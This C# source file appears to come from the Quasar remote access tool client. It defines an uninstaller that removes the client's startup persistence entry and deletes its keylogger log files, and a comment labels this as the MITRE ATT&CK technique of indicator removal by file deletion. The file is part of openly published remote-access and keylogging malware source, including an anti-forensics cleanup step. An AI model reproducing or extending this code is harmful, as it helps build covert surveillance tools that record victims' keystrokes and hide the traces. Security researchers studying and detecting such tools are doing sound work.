using Quasar.Client.Config;
using Quasar.Client.IO;
using Quasar.Common.Logger;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientUninstaller : ClientSetupBase
    {
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1070.004: Indicator Removal: File Deletion
        /// </remarks>
        public void Uninstall()
        {
            if (Settings.STARTUP)
            {
                var clientStartup = new ClientStartup();
                clientStartup.RemoveFromStartup(Settings.STARTUPKEY);
                Logger.Debug("Removed client from startup.");
            }

            if (Settings.ENABLELOGGER && Directory.Exists(Settings.LOGSPATH))
            {
                // this must match the keylogger log files
                Regex reg = new Regex(@"^\d{4}\-(0[1-9]|1[012])\-(0[1-9]|[12][0-9]|3[01])$");

                foreach (var logFile in Directory.GetFiles(Settings.LOGSPATH, "*", SearchOption.TopDirectoryOnly)
                    .Where(path => reg.IsMatch(Path.GetFileName(path))).ToList())
                {
                    try
                    {
                        File.Delete(logFile);
                        Logger.Debug("Deleted keylog file " + logFile);
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(String.Format("Exception when deleting keylog file {0}: {1}", logFile, ex.ToString()));
                    }
                }
            }
        }
    }
}
